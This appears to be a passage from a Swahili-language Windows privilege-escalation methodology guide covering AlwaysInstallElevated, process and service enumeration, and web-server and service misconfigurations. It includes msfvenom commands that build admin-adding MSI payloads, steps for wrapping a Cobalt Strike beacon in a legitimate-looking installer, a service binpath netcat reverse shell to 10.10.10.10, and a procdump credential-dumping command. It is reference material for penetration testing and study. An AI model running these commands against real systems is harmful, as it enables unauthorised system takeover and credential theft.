Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** registry keys hizi 2 **zimewashwa** (thamani ni **0x1**), basi watumiaji wenye kiwango chochote cha ruhusa wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una session ya meterpreter, unaweza kuendesha mbinu hii kiotomatiki kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa binary ya Windows MSI ya kuongeza marupurupu. Script hii huandika installer ya MSI iliyokusanywa awali ambayo hukuomba kuongeza mtumiaji/kikundi (kwa hivyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kupata upendeleo wa juu.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kwamba unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** payload mpya ya Windows EXE TCP kwa kutumia Cobalt Strike au Metasploit, na uihifadhi katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Ipe mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague payload ya Beacon uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Angazia mradi wa **AlwaysPrivesc** katika **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama **Author** na **Manufacturer**, ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya mradi kulia na uchague **View > Custom Actions**.
- Bofya **Install** kulia na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kwamba payload ya beacon inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia udhaifu huu, unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachowekwa kwenye **kumbukumbu**, kwa hiyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, ni muhimu kujua logs zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, kuhakikisha kwamba kila nywila ni **ya kipekee, inatengenezwa kwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, na hivyo kuwawezesha kuona nywila za admin wa ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi ya kawaida huhifadhiwa ndani ya LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika kujaribu **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha zaidi usalama wa mfumo.\
[**Maelezo zaidi kuhusu LSA Protection hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Akiba

**Vitambulisho vya kikoa** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida vitambulisho vya kikoa vya mtumiaji huanzishwa.\
[**Maelezo zaidi kuhusu vitambulisho vilivyohifadhiwa kwenye akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa vikundi vyovyote ulivyomo vina ruhusa muhimu.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye haki za juu

Ikiwa **uko katika kikundi chenye haki za juu, unaweza kuongeza haki zako**. Jifunze kuhusu vikundi vyenye haki za juu na jinsi ya kuvitumia vibaya ili kuongeza haki zako hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udanganyifu wa token

**Jifunze zaidi** kuhusu **token** ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya clipboard

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato, **angalia kama kuna nywila kwenye command line ya mchakato**.\
Angalia kama unaweza **kubadilisha binary inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia mashambulizi yanayoweza kutokea ya [**DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima angalia kama kuna [**electron/cef/chromium debuggers** zinazoendesha; unaweza kuzitumia vibaya ili kuongeza ruhusa](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener inaweza kuwepo kwa muda mfupi, kwa hivyo kutokuonekana kwenye picha moja ya ports iliyokusanywa bila kuingilia mfumo hakuthibitishi kuwa haikuwahi kufichuliwa. Linganisha listener yoyote uliyoona na PID yake, mmiliki wa mchakato, na uwezo wa mtumiaji mwenye ruhusa za chini kuifikia; jina la programu au debug flag pekee havithibitishi uwezekano wa kutekeleza code kutoka kwa mtumiaji mwingine. Fanya uchunguzi wa kawaida kwa njia isiyoingilia mfumo, badala ya kutuma amri za debugger.

**Kuangalia ruhusa za faili za binary za michakato**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda zilizo na binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za Snort dynamic preprocessor

Snort 2 inaweza kupakia shared libraries kutoka kwenye `dynamicpreprocessor directory` iliyotajwa kwenye usanidi uliochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort chini ya akaunti tofauti, kagua usanidi huo mahususi na ACL ya saraka ya modules iliyotajwa. Ikiwa token yako inaweza kuunda faili humo, njia hiyo inafaa kuchunguzwa kama eneo linaloweza kuruhusu code execution task au service hiyo itakapopakia modules tena. Thibitisha effective privileges za akaunti inayoendesha programu, usanidi unaotumika, ulinganifu wa modules, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikiwa pekee haithibitishi privilege escalation. [Nyaraka za Snort kuhusu upakiaji wa dynamic preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa modules wakati wa runtime.

### Web service yenye privileges za juu na document root inayoweza kuandikiwa

Kwenye usakinishaji wa Apache wa Windows, linganisha njia ya executable ya service na akaunti inayoendesha programu na `DocumentRoot` iliyo kwenye `httpd.conf` inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi ni `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye privileges za chini anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, code execution ya upande wa server inaweza kuvuka mpaka wa privileges wa host. Thibitisha kwamba service inaendeshwa, njia halisi inahudumiwa, na handler ya upande wa server inachakata aina ya faili hiyo; root inayoweza kuandikiwa yenyewe inathibitisha tu uundaji wa faili. Kagua ACL bila kuandika probe:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, huduma inaweza kuelekeza kwenye `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yenye toleo maalum (au `C:\wamp\...` kwa muundo wa 32-bit), huku usanidi ukiwa karibu nayo chini ya `conf\httpd.conf` na mzizi chaguomsingi ukiwa `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja picha halisi ya huduma, utambulisho inaoendesha nao, `DocumentRoot` inayotumika (ikijumuisha upanuzi wa `${INSTALL_DIR}` na mabadiliko ya virtual-host), na ACL ya mzizi. Saraka ya WAMP inayoweza kuandikwa haithibitishi kwamba Apache inaendeshwa kama `SYSTEM` au itatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi huduma ya Windows inavyochagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Mzizi wa IIS unaoweza kuandikwa na utambulisho wa network wa application pool

Kwa IIS, linganisha saraka halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool iliyosanidiwa na handler ya upande wa seva. Code iliyowekwa kwenye saraka inayotolewa huendeshwa kama pool tu ikiwa IIS inachakata aina hiyo ya faili na route inafikika. Kagua ruhusa halisi za mtumiaji wa sasa za kuunda faili, hali ya runtime ya site, handler na mabadiliko ya kila path kabla ya kuchukulia saraka inayoweza kuandikwa kuwa njia ya kutekeleza code.

Uundaji wa ASP.NET wa code wakati wa runtime huleta path tofauti ya kukagua: faili zinazozalishwa chini ya saraka ya compilation ya programu. Chaguomsingi ni saraka ya `Temporary ASP.NET Files` iliyo chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya programu inaweza kuibadilisha. [Microsoft inaeleza mahali ilipo na saraka zake ndogo kwa kila programu](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenganisha saraka za compilation wakati application pool haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa tokeni yenye ruhusa ndogo inaweza kubadilisha source inayozalishwa kwenye cache ya **programu husika**, bainisha kama programu hiyo itai-compile upya chini ya [utambulisho wa worker-process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye ruhusa zaidi. ACL ya faili au saraka pekee haithibitishi utekelezaji wa code: linganisha cache na programu inayotumika, tokeni na ACL halisi, mipangilio ya compilation, utambulisho wa process, na muda wa compilation upya. Tumia ukaguzi wa metadata wa kusoma tu; usianzishe compilation wala kubadilisha faili za cache wakati wa enumeration.

IIS pool iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwa rasilimali za domain kwa kutumia **akaunti ya kompyuta mwenyeji**, ingawa tokeni yake ya ndani inaweza kuwa na ruhusa chache. `LocalSystem` tayari ina ruhusa kubwa ndani ya kompyuta na pia hutumia akaunti ya kompyuta kwenye mtandao; `LocalService` kwa kawaida hutumia vitambulisho vya mtandao visivyojulikana. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa network wa application-pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usipoainishwa unaweza kurithi chaguomsingi za pool, ambazo hutofautiana kati ya matoleo ya IIS; kwa hiyo, tambua usanidi halisi badala ya kukisia kutokana na jina la pool. Ikiwa utekelezaji wa code unafikia pool yenye utambulisho wa network wa akaunti ya kompyuta, tathmini ruhusa za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) huhitaji ruhusa za replication kwenye domain naming context; tiketi ya akaunti ya mashine au jukumu la host pekee havithibitishi ruhusa hizo. Enumeration tulivu inapaswa kukagua usanidi na ACL bila kupakia faili, kuanzisha uthibitishaji wa network, au kuomba tiketi.

Kwa ASP.NET handler inayoweza kusomwa na inayoanzisha helper process, fuatilia thamani yoyote inayotokana na request kupitia uthibitishaji, decryption, validation na uundaji wa amri. Handler inayounganisha tokeni iliyodecode kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu shell metacharacters kubadilisha amri; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kwamba caller asiyeaminika anaweza kweli kuathiri thamani iliyodecode na kufikia handler, kisha tambua utambulisho halisi wa application-pool au wa impersonation na utambulisho wa child process. Mstari wa source unaoweza kusomwa, listener ya localhost, au udhaifu wa muundo wa tokeni pekee havithibitishi utekelezaji wa amri wenye ruhusa kubwa. Kagua source na usanidi wa pool bila kutuma request bandia au kuendesha helper wakati wa enumeration tulivu.

Kwa huduma ya PHP kwenye Windows, path inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji mwenye ruhusa ndogo, kwa utambulisho wa worker. Thibitisha kwamba request inaweza kufikia kauli hiyo, path iliyotatuliwa inaelekeza kwenye faili ambayo mtumiaji mwenye ruhusa ndogo anaweza kubadilisha na worker anaweza kusoma, vizuizi vya PHP vya path vinavyotumika vinaruhusu include, na worker inaendeshwa kwa ruhusa za juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee havithibitishi mnyororo huu; kagua source, utambulisho wa huduma na ACL za faili bila kuita endpoint wakati wa enumeration tulivu.

### Uchimbaji wa Nywila kutoka Kwenye Kumbukumbu

Unaweza kuunda memory dump ya process inayoendeshwa kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials katika maandishi wazi kwenye kumbukumbu**; jaribu kutupa kumbukumbu na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kuruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za project zenye upendeleo

Programu inayofungua kiotomatiki projects kutoka kwenye drop directory inayoweza kuandikwa na mtumiaji wa kiwango cha chini huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoziingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au task inayoifungua, utambulisho wake halisi, na build ya parser. Tatizo la kihistoria la kufungua/kurejesha project ya Ghidra [liliruhusu external entities za XML katika metadata ya project](https://github.com/NationalSecurityAgency/ghidra/issues/71); entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza ikiwa [sera ya outbound SMB na NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu. Hili ni dokezo la uwezekano wa kufichuka kwa credentials, si ufikiaji wa administrator wa moja kwa moja: jibu lazima liweze kutumika kupitia njia tofauti iliyoidhinishwa au iliyo hatarini, na builds za sasa lazima zikaguliwe kulingana na hali halisi ya patches zake. Usifungue project iliyoundwa kwa makusudi wakati wa enumeration tulivu; kagua workflow ya uingizaji na ACLs.

## Huduma

Haki ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya kitu cha Service Control Manager (SCM) ni tofauti na haki kwenye huduma iliyopo. Ombi la ufikiaji la kusoma tu la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) lililofanikiwa kwa haki hiyo ni dokezo la ukaguzi, si uthibitisho kwamba huduma mpya inaweza kuendeshwa. [`CreateService` hurudisha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye haki za huduma zilizoombwa wakati wa kuundwa; kufungua tena huduma baadaye hufanya ukaguzi tofauti wa ufikiaji na kunaweza kushindwa hata kama handle ya awali ingeweza kutumika. Thibitisha kando tokeni halisi ya ndani au ya mbali, haki za handle zilizotolewa, akaunti ya huduma, sera ya kuanza, na njia ya executable. Usitengeneze wala kuanzisha huduma wakati wa enumeration tulivu.

Kwa njia ya kusakinisha huduma kwa mbali, linganisha haki hizo za SCM na share kwenye target ambayo **logon hiyo hiyo ya mtandao** inaweza kuiandikia, NTFS ACL yake ya msingi, na njia ya executable ya ndani ambayo akaunti ya huduma inaweza kuiendesha. Akaunti isiyo ya admin inaweza kuvuka mpaka huu ikiwa kuna haki pana zisizo za kawaida za SCM na njia ya kuweka faili; share ya kiutawala si sharti la moja kwa moja. Ufikiaji wa kuandika kwenye share pekee, au dokezo la kuunda huduma kupitia SCM pekee, havithibitishi kwamba huduma mpya inaweza kuanza ikiwa na utambulisho wa juu zaidi.

Huduma iliyopo inaweza kuita executable msaidizi wakati wa kuanza, kuzima, au tukio jingine la lifecycle hata kama msaidizi huyo hayupo kwenye `ImagePath` yake. Ikiwa jina la msaidizi linatatuliwa kuwa saraka inayoweza kuandikwa na mtumiaji wa kiwango cha chini na huduma inaendeshwa chini ya utambulisho wa juu zaidi, faili ya msaidizi inayokosekana inaweza kuwa nafasi ya masharti ya kubadilisha faili. Thibitisha **code halisi ya huduma au mwito wa msaidizi ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, haki za kuunda saraka, utambulisho wa huduma, na trigger ya lifecycle inayopatikana. Saraka ya huduma inayoweza kuandikwa au faili inayokosekana pekee havithibitishi kwamba huduma itapakia faili hiyo; ukaguzi tulivu haupaswi kuanzisha wala kusimamisha huduma.

Kwa huduma iliyopo, [`SERVICE_START huruhusu kutoa arguments kwa StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua code ya huduma au interface yake iliyoandikwa kwenye nyaraka kabla ya kuchukulia ruhusa ya kuanza kuwa zaidi ya haki ya kuidhibiti. Ikiwa inatumia argument iliyochaguliwa na mpigaji kama njia ya logi au export, thibitisha utambulisho wa huduma, mtiririko halisi wa argument hadi uandishi, vizuizi vya njia, na ruhusa za **faili linaloundwa**. Kuandika kwenye saraka iliyolindwa kunaweza kuwa escalation tu ikiwa kuna consumer au loader tofauti yenye upendeleo inayokubali faili hilo; logi inayoweza kuandikwa au haki ya kuanza pekee haitoshi. Orodha ya mali ya mfumo tulivu haipaswi kuanzisha huduma au kuunda faili ya majaribio.

Kwa agent ya ufuatiliaji ya NSClient++, faili ya `nsclient.ini` inayosomeka ni **dokezo la kukagua configuration**: inaweza kuwa na credentials za web, huku `boot.ini` inaweza kuelekeza configuration kwenye eneo jingine. Kagua akaunti halisi ya huduma, listener ya WEB na sera ya ufikiaji, na kama role iliyothibitishwa inaweza kubadilisha settings au scripts. Utekelezaji wenye upendeleo pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), haki halisi ya kusajili au kurekebisha command, na trigger inayoitekeleza chini ya utambulisho wa huduma. Listener inayokubali loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, password, au listener pekee hazithibitishi haki hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa enumeration tulivu. Tazama [muundo wa faili wa NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa web na scripts](https://nsclient.org/docs/setup/securing/), na [configuration ya external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa huduma ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya huduma inayoendesha programu na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu saidizi hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kazi iliyosanidiwa. Kagua executable saidizi na ACLs za saraka zake za wazazi kabla ya kuchukulia ruhusa za wrapper kuwa ndizo zinazofafanua mpaka mzima wa huduma. Endpoint ya ndani ya WCF au SOAP inayofichuliwa na programu hiyo saidizi ni dokezo tofauti la ukaguzi: thibitisha kwamba mtumiaji wa haki za chini anaweza kufikia listener, operation halisi inakubali ingizo lake, na mchakato wa huduma saidizi hutekeleza operation isiyo salama chini ya utambulisho wa juu zaidi. Akaunti ya huduma, URL ya endpoint, au njia inayoweza kuandikwa pekee havithibitishi escalation; epuka kuita operations za huduma wakati wa enumeration tulivu.

Kwa operation maalum ya WCF, fuatilia string inayodhibitiwa na mpigaji inapoingia kwenye PowerShell runspace yoyote. [`Pipeline.Commands.AddScript huongeza maandishi ya script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke huendesha pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye credentials za usafirishaji za Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha utambulisho wa client, lakini ruhusa ya kuita **operation hiyo mahususi** na utambulisho halisi wa runspace lazima vikaguliwe kando. Njia kutoka kwenye ingizo la mpigaji mwenye haki za chini hadi `AddScript` chini ya utambulisho wa huduma wenye haki za juu zaidi ni mpaka wa code execution; port inayosikilizwa, client aliyethibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua huduma iliyosakinishwa, contract, authorization, na mipangilio ya impersonation kwa njia tuli bila kuita endpoint wakati wa enumeration.

Service Triggers huruhusu Windows kuanzisha huduma hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO refresh, n.k.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanzisha huduma zenye upendeleo kwa kuwasha triggers zake. Tazama mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya Visual Studio ya kukusanya diagnostics

Usakinishaji wa Visual Studio wenye tooling ya C/C++ unaweza kujumuisha `VSStandardCollectorService150`, huduma ya diagnostics iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia junction na race ya object-manager-link kuelekeza upya reset ya DACL ya huduma. Escalation iliyoonyeshwa pia ilihitaji njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider pamoja na target yake ya `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa triage tulivu, kagua akaunti ya huduma hiyo moja na njia ya binary yake, angalia kama njia ya Setup WMI compiler ipo, na thibitisha hali ya patches ya kipengele kilichosakinishwa. Ingizo la huduma, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kwamba host iko hatarini. Ukaguzi hauhitaji kuanzisha huduma au kuendesha repair.

Pata orodha ya huduma:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa huduma

Ikiwa unapata hitilafu hii (kwa mfano, kwa SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Huduma haiwezi kuwashwa, kwa sababu imezimwa au hakuna vifaa vilivyowashwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba service upnphost hutegemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kutatua** tatizo hili ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayotekelezwa na service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Haki zinaweza kupandishwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huruhusu kusanidi upya ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
